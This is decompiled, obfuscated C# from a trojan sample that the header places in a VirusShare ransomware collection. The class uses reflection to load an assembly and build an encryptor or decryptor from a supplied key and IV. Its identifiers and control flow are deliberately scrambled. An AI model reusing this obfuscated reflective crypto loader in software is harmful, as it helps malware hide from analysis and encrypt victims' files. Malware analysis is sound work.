// Decompiled with JetBrains decompiler
// Type: .
// Assembly: serLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EB10F7D0-661D-4A45-B90F-D464336E900E
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-2bf56eec4fab77d339385ad7d85e751f1d68713a932b01be3c5a86a9288e729f.exe

using \u0001;
using \u000E;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0002
{
  internal sealed class \u0005 : IDisposable
  {
    private readonly Type \u0001;
    private readonly object \u0001;

    public \u0005()
    {
      Assembly assembly1;
      try
      {
        try
        {
          assembly1 = \u0098\u0004.\u007F\u0005(\u0008.\u0002(453));
          this.\u0001 = \u0095\u0004.\u007E\u001C\u0005((object) assembly1, \u0008.\u0002(558));
        }
        catch (FileNotFoundException ex)
        {
          assembly1 = \u0098\u0004.\u007F\u0005(\u0008.\u0002(611));
          this.\u0001 = \u0095\u0004.\u007E\u001C\u0005((object) assembly1, \u0008.\u0002(624));
        }
        this.\u0001 = \u009F\u0003.\u008C\u0002(this.\u0001);
      }
      catch (Exception ex)
      {
        Assembly assembly2 = assembly1;
        \u0002.\u0002(ex, (object) assembly2, (object) this);
        throw;
      }
    }

    public ICryptoTransform \u0002([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
    {
      object[] objArray1;
      MethodInfo methodInfo1;
      try
      {
        MethodInfo setMethod = this.\u0001.GetProperty(\u0008.\u0002(685)).GetSetMethod();
        object obj3 = this.\u0001;
        object[] objArray2 = new object[1];
        if (true)
          goto label_4;
label_1:
        objArray1[0] = (object) obj0;
        object[] parameters1 = objArray1;
        setMethod.Invoke(obj3, parameters1);
        MethodInfo methodInfo2 = \u0004\u0005.\u007E\u009F\u0005((object) \u008A\u0004.\u007E\u0097\u0003((object) this.\u0001, \u0008.\u0002(690)));
        object obj4 = this.\u0001;
        object[] objArray3 = new object[1];
        if (true)
          goto label_5;
label_2:
        objArray1[0] = (object) obj1;
        object[] parameters2 = objArray1;
        methodInfo2.Invoke(obj4, parameters2);
        MethodInfo method = this.\u0001.GetMethod(obj2 ? \u0008.\u0002(716) : \u0008.\u0002(695), new Type[0]);
        if (true)
          goto label_6;
label_3:
        return (ICryptoTransform) \u0003\u0005.\u007E\u0095\u0005((object) methodInfo1, this.\u0001, new object[0]);
label_6:
        methodInfo1 = method;
        goto label_3;
label_5:
        objArray1 = objArray3;
        goto label_2;
label_4:
        objArray1 = objArray2;
        goto label_1;
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo3 = methodInfo1;
        object[] objArray4 = objArray1;
        byte[] numArray1 = obj0;
        byte[] numArray2 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj2;
        \u0002.\u0002(ex, (object) methodInfo3, (object) objArray4, (object) this, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    public void \u0002()
    {
      try
      {
        do
        {
          if (true)
            goto label_3;
label_1:
          continue;
label_3:
          this.\u0001.GetMethod(\u0008.\u0002(737)).Invoke(this.\u0001, new object[0]);
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0002.\u0002(ex, (object) this);
        throw;
      }
    }

    public void Dispose()
    {
      try
      {
        this.\u0002();
      }
      catch (Exception ex)
      {
        \u0002.\u0002(ex, (object) this);
        throw;
      }
    }
  }
}
